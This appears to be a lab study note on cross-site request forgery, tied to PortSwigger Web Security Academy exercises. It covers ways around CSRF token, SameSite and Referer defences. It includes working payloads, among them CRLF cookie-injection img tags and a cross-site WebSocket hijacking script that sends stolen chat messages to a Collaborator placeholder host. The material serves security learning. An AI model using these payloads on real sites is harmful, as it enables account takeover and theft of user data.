# Cross-Site Request Forgery (CSRF)

{% hint style="info" %}
Allows an attacker to induce users to perform actions that they do not intend to perform.
{% endhint %}

## Overview

* **Impact of a CSRF attack** - attacker might gain full control over the user's account.
* **How does CSRF work?**
  * **A relevant action** - an action within the app that the attacker has a reason to induce. This might be a privileged action.
  * **Cookie-based session handling** - the action involves issuing one or more HTTP requests, and the app relies solely on session cookies to identify the user.
  * **No unpredictable request parameters** - requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.

{% hint style="warning" %}
**Important Caveat** - Although CSRF is described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.
{% endhint %}

* **Construct a CSRF attack** - use a CSRF PoC generator.

{% hint style="success" %}
**Lab** - Store a CSRF PoC on a website and force the victim to access the page.
{% endhint %}

## Bypassing CSRF Token Validation

### Validation Depends on Request Method

* Apps validate the token when the request uses the POST method but skip validation when GET is used.

{% hint style="success" %}
**Lab** - Change the request method to GET and omit/change the CSRF token parameter/value.
{% endhint %}

### Validation Depends on Token Being Present

* Applications validate the token when it is present but skip validation if the token is omitted.

{% hint style="success" %}
**Lab** - Omit the CSRF token parameter and send the request.
{% endhint %}

### Token Is Not Tied to the User Session

* Apps do not validate whether the token belongs to the same session as the user who is making the request.

{% hint style="success" %}
**Lab** - Create an account and grab a valid CSRF token. Use the valid CSRF token while crafting the HTML page and send it to the victim.
{% endhint %}

### Token Is Tied to a Non-Session Cookie

* Apps do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions.
* Occurs when the application employs two different frameworks - one for session handling and one for CSRF protection.
* Harder to exploit but still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in the victim's browser, the attack is possible.
* Attacker creates an account, obtains a token & associated cookie, leverages cookie-setting behavior to place their cookie in the victim's browser, and feeds their token.
* Cookie-setting behavior can be exploited in another application if it's the same parent domain.

{% hint style="success" %}
**Lab** - Search field creates a cookie with the keyword. In the CSRF PoC, replace the CSRF token & include the associated cookie:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
{% endhint %}

### Token Is Simply Duplicated in a Cookie

* Apps check whether the CSRF token & associated cookie are the same. Vulnerable since no checks are performed server-side.
* Apps with cookie-setting behavior can be used to exploit this further.

{% hint style="success" %}
**Lab** - Search field creates a cookie with the keyword. In the CSRF PoC, replace the CSRF token with `hacked` & include the associated cookie:

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
{% endhint %}

## Bypassing SameSite Cookie Restrictions

* `SameSite` is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites.
* Provides partial protection against a variety of cross-site attacks, including CSRF, cross-site leaks, and some CORS exploits.
* Chrome applies `Lax` SameSite restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level.
* A **site** is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name.

### Site vs. Origin

* Two URLs are considered to have the **same origin** if they share the exact same scheme (http/https), domain name, and port.
* Two URLs are considered to have the **same site** if they share the same scheme & TLD+1 (e.g. `http://app.domain.com` & `http://test.domain.com`).

### How SameSite Works

Enables browsers and website owners to limit which cross-site requests, if any, should include specific cookies.

<table><thead><tr><th width="120">Value</th><th>Behavior</th></tr></thead><tbody><tr><td><code>Strict</code></td><td>Browsers will not send it in any cross-site requests.</td></tr><tr><td><code>Lax</code></td><td>Browsers will send the cookie in cross-site requests only if the request uses the GET method &#x26; resulted from a top-level navigation by the user (e.g. clicking a link). Not included in background requests initiated by scripts, iframes, or resource references (&#x3C;img&#x3E;, &#x3C;iframe&#x3E;).</td></tr><tr><td><code>None</code></td><td>Browsers will send this cookie in all requests to the site that issued it, even those triggered by completely unrelated third-party sites.</td></tr></tbody></table>

{% hint style="warning" %}
When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute. Otherwise, browsers will reject the cookie and it won't be set.
{% endhint %}

### Bypassing Lax Restrictions Using GET Requests

* Servers do not validate whether they receive a GET or POST request to a given endpoint, even those expecting a form submission.
* Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line.

{% hint style="success" %}
**Lab** - Convert the request to the GET method & generate a CSRF PoC. Check whether the server accepts the GET method. If not, add a parameter `_method` with value `POST`.
{% endhint %}

### Bypassing Restrictions Using On-Site Gadgets

* If a cookie is set with the `SameSite=Strict` attribute, find a gadget that results in a secondary request within the same site to bypass it.
* A possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

{% hint style="success" %}
**Lab** - Check for a page that performs a client-side redirect (e.g. comment section). Validate if the endpoint is vulnerable to path traversal. Generate a CSRF PoC for the vulnerable path traversal endpoint and include the change-email request with parameter values accordingly.
{% endhint %}

### Bypassing Restrictions via Vulnerable Sibling Domains

* Vulnerabilities that enable eliciting an arbitrary secondary request (e.g. XSS) can compromise site-based defenses, exposing all of the site's domains to cross-site attacks.
* If a website supports WebSockets, functionality might be vulnerable to cross-site WebSocket hijacking - a CSRF attack targeting a WebSocket handshake.

{% code title="Payload" %}
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
    ws.send("READY");};
    ws.onmessage = function(event) {
    fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});};
</script>
```
{% endcode %}

{% hint style="success" %}
**Lab** - Find a sibling domain that is vulnerable to XSS and inject the above payload in URL-encoded format.
{% endhint %}

### Bypassing Lax Restrictions with Newly Issued Cookies

* If a website doesn't include the `SameSite` attribute, Chrome automatically applies `Lax` by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests.
* As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.
* This two-minute window does not apply to cookies that were explicitly set with the `SameSite=Lax` attribute.

{% code title="Payload" %}
```javascript
window.onclick = () => {window.open('https://vulnerable-website.com/login/sso');}
```
{% endcode %}

{% hint style="success" %}
**Lab** - Refer to the solution. The OAuth flow sets a new session cookie even though logged in, without the SameSite attribute, when invoking a specific endpoint. Generate a CSRF PoC combined with the above payload.
{% endhint %}

## Bypassing Referer-Based CSRF Defenses

* Apps make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, by verifying the request originated from the app's own domain.
* The `Referer` header is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form.

### Validation Depends on Header Being Present

* Apps validate the `Referer` header when it is present in requests but skip validation if the header is omitted.
* An attacker can craft their CSRF exploit in a way that causes the victim's browser to drop the `Referer` header in the resulting request.

{% code %}
```html
<meta name="referrer" content="never">
```
{% endcode %}

{% hint style="success" %}
**Lab** - Include the above meta tag after the form tag to prevent the browser from sending the Referer header.
{% endhint %}

### Validation Can Be Circumvented

* If the app validates that the domain in the `Referer` starts with an expected value, the attacker can place this as a subdomain of their own domain.
* If the app validates that the `Referer` contains its own domain name, the attacker can place the required value elsewhere in the URL.
* In an attempt to reduce the risk of sensitive data being leaked, many browsers now strip the query string from the `Referer` header by default.
* This can be overridden by making sure the response containing the exploit has the `Referrer-Policy: unsafe-url` header set.

{% hint style="success" %}
**Lab** - Include the above header in the response, as well as append the original domain as a query by including it in `history.pushState(",",'/?orginal-url')`.
{% endhint %}

## Reference

* [CSRF - Why PUT Requests Are Safer and How Modern Browsers Prevent CSRF Attacks](https://shreyapohekar.com/blogs/csrf-why-put-requests-are-safer-and-how-modern-browsers-prevent-csrf-attacks/)
* [How Servers Handle CSRF Tokens: Generation, Validation, and Best Practices](https://shreyapohekar.com/blogs/how-servers-handle-csrf-tokens-generation-validation-and-best-practices/)